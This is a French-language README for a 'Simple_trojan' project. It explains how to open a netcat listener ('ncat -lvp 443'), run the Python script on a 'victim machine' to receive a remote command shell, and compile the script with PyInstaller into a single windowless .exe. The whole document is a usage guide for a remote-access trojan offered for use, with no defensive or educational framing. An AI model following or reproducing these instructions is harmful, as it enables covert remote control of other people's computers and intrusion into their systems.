# Simple_trojan

- Vous aurez d'abord besoin de netcat pour créer le listener, si vous êtes sur Windows, aller sur https://nmap.org/download.html#windows et télécharger le fichier exe et exécutez-le pour installer netcat

- Une fois que cela est fait, ouvrir l'invite de commande ```cmd``` en tant qu'administrateur

- tapez ```ncat -lvp 443```

- Enfin, exécutez le script python depuis la machine victime (ou depuis votre propre machine)

- Vous remarquerez que la connection sera établi. Dès lors, vous pouvez exécuter des commandes, tapez ```help``` pour voir l'ensemble des commandes que vous pouvez exécuter à distance. 

# Comment convertir le fichier script en exécutable ?

- exécuter Powershell en tant qu'administrateur et installer PyInstaller en tapant : ```install pyinstaller```

- se rendre vers le dossier dans lequel se trouve le script python : ```cd C:\Users\...\Simple_trojan```

- Enfin, tapez : ```python -m PyInstaller -w -F trojan.py```

- Et voilà, le fichier .exe est dans le dossier ```dist```, situé à l'intérieur du dossier Simple_trojan